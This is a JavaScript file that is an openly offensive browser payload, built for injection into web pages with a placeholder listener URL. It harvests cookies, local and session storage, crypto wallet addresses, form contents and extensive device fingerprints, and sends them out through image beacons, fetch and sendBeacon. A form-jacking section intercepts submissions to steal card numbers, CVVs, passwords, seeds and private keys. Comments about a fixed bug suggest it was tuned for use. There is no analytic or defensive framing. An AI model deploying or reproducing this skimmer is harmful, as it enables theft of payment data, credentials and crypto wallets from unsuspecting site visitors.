// ============================================================
// CONFIGURATION – CHANGE ONLY THIS ONE LINE
// ============================================================
const EXFIL_URL = "http://127.0.0.1:11111";   // ← YOUR LISTENER
// ============================================================

(async function () {
    let sent = false;

    const data = {
        timestamp: new Date().toISOString(),
        url: location.href,
        referrer: document.referrer || null,
        title: document.title,
        origin: location.origin,

        userAgent: navigator.userAgent,
        language: navigator.language,
        languages: navigator.languages?.join(",") || null,
        platform: navigator.platform,
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack || null,
        plugins: Array.from(navigator.plugins || []).map(p => `${p.name} ${p.version || ''}`).join(" | "),
        deviceMemory: navigator.deviceMemory || null,
        hardwareConcurrency: navigator.hardwareConcurrency || null,
        touchscreen: "ontouchstart" in window || navigator.maxTouchPoints > 0,
        windowSize: `${innerWidth}x${innerHeight} (outer: ${outerWidth}x${outerHeight})`,
        screen: `${screen.width}x${screen.height}x${screen.colorDepth} (pixelRatio: ${devicePixelRatio})`,

        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffset: new Date().getTimezoneOffset(),

        connection: navigator.connection ? {
            downlink: navigator.connection.downlink,
            effectiveType: navigator.connection.effectiveType,
            rtt: navigator.connection.rtt,
            saveData: navigator.connection.saveData
        } : null,

        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),

        walletAddress: window.ethereum?.selectedAddress ||
                       window.solana?.publicKey?.toString() ||
                       window.phantom?.solana?.publicKey?.toString() || null,
        walletProvider: window.ethereum ? "MetaMask/Ethereum" :
                        window.solana?.isPhantom ? "Phantom (Solana)" :
                        window.phantom ? "Phantom" : null,

        battery: "getBattery" in navigator ? await navigator.getBattery().then(b => ({
            level: b.level,
            charging: b.charging,
            chargingTime: b.chargingTime === Infinity ? "∞" : b.chargingTime,
            dischargingTime: b.dischargingTime === Infinity ? "∞" : b.dischargingTime
        })).catch(() => "blocked") : "not supported",

        canvas: getCanvasFingerprint(),
        webgl: getWebGLFingerprint(),
        audio: await getAudioFingerprint(),
        fonts: await detectInstalledFonts(),
        speechVoices: "speechSynthesis" in window ? speechSynthesis.getVoices().map(v => v.name).join(" | ") : null,
        mediaDevices: await getMediaDevices(),
        webrtcLocalIP: await getWebRTCLocalIP(),

        domSnippet: document.documentElement.outerHTML.substring(0, 10000),
        forms: getAllFormValues()        // ← FIXED FUNCTION
    };

    // ====================== SEND ======================
    function send() {
        if (sent) return;
        sent = true;

        const json = JSON.stringify(data);
        const b64 = btoa(unescape(encodeURIComponent(json)))
                    .replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");

        // Primary
        new Image().src = `${EXFIL_URL}?data=${b64}`;

        // Backup fetch
        fetch(EXFIL_URL, {method:"POST", body:json, mode:"no-cors", keepalive:true}).catch(()=>{});

        // Backup beacon
        const tryBeacon = () => navigator.sendBeacon?.(EXFIL_URL, json);
        addEventListener("pagehide", tryBeacon);
        addEventListener("beforeunload", tryBeacon);
    }

    send();

    // ====================== FORM JACKING ======================
    document.addEventListener("submit", e => {
        const fd = new FormData(e.target);
        const sensitive = {};
        for (const [k, v] of fd.entries()) {
            if (/card|cc|cvc|cvv|exp|pass|pwd|password|wallet|seed|private|key/i.test(k)) {
                sensitive[k] = v;
            }
        }
        if (Object.keys(sensitive).length) {
            const payload = btoa(JSON.stringify({url: location.href, fields: sensitive}));
            new Image().src = `${EXFIL_URL}_form?fields=${payload}`;
        }
    }, true);

    // ====================== FIXED + SAFE HELPERS ======================
    function getAllFormValues() {
        const forms = [];
        // ← THIS WAS THE BUG: document.forms is an HTMLCollection, not an Array
        Array.from(document.forms).forEach(form => {
            const obj = {};
            new FormData(form).forEach((value, key) => {
                obj[key] = value;
            });
            if (Object.keys(obj).length) forms.push(obj);
        });
        return forms;
    }

    function getCanvasFingerprint() {
        try {
            const c = document.createElement("canvas");
            const x = c.getContext("2d");
            x.textBaseline = "alphabetic";
            x.fillStyle = "#f60"; x.fillRect(125,1,62,20);
            x.fillStyle = "#069"; x.fillText("Cwm fjordbank glyphs vext quiz", 2, 15);
            x.fillStyle = "rgba(102,204,0,0.7)"; x.fillText("Dead", 4, 45);
            return c.toDataURL();
        } catch { return "blocked"; }
    }

    function getWebGLFingerprint() {
        try {
            const c = document.createElement("canvas");
            const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
            if (!gl) return "no webgl";
            const ext = gl.getExtension("WEBGL_debug_renderer_info");
            return {
                vendor: ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
                renderer: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)
            };
        } catch { return "blocked"; }
    }

    async function getAudioFingerprint() {
        try {
            const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1,5000,44100);
            const o = ctx.createOscillator(); o.type = "triangle"; o.frequency.value = 10000;
            const comp = ctx.createDynamicsCompressor();
            comp.threshold.value = -50; comp.knee.value = 40; comp.ratio.value = 12;
            o.connect(comp); comp.connect(ctx.destination); o.start(0);
            const buf = await ctx.startRendering();
            let hash = 0;
            for (let i = 0; i < buf.length; i++) hash = ((hash << 5) - hash + buf.getChannelData(0)[i]) | 0;
            return hash.toString(36);
        } catch { return "blocked"; }
    }

    async function detectInstalledFonts() {
        const testFonts = ["Arial","Courier New","Georgia","Helvetica","Impact","Tahoma","Trebuchet MS","Verdana","Comic Sans MS","Times New Roman","Palatino","Garamond","Arial Black","Calibri","Cambria","Consolas"];
        const span = document.createElement("span");
        span.textContent = "mmmmmmmmmmllllllll";
        span.style.fontSize = "200px";
        span.style.position = "absolute";
        span.style.left = "-9999px";
        document.body.appendChild(span);
        const baseWidth = span.offsetWidth;
        const detected = [];
        for (const font of testFonts) {
            span.style.fontFamily = font;
            if (span.offsetWidth !== baseWidth) detected.push(font);
        }
        document.body.removeChild(span);
        return detected.join(",");
    }

    async function getMediaDevices() {
        try {
            const devs = await navigator.mediaDevices.enumerateDevices();
            return devs.map(d => `${d.kind}: ${d.label || "no label (permission denied)"}`).join(" | ");
        } catch { return "blocked"; }
    }

    async function getWebRTCLocalIP() {
        return new Promise(resolve => {
            const pc = new RTCPeerConnection({iceServers:[]});
            pc.createDataChannel("");
            pc.createOffer().then(o => pc.setLocalDescription(o));
            pc.onicecandidate = e => {
                if (e.candidate?.candidate) {
                    const ip = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/)?.[1];
                    if (ip) { pc.close(); resolve(ip); }
                }
            };
            setTimeout(() => { pc.close(); resolve("blocked"); }, 3000);
        });
    }
})();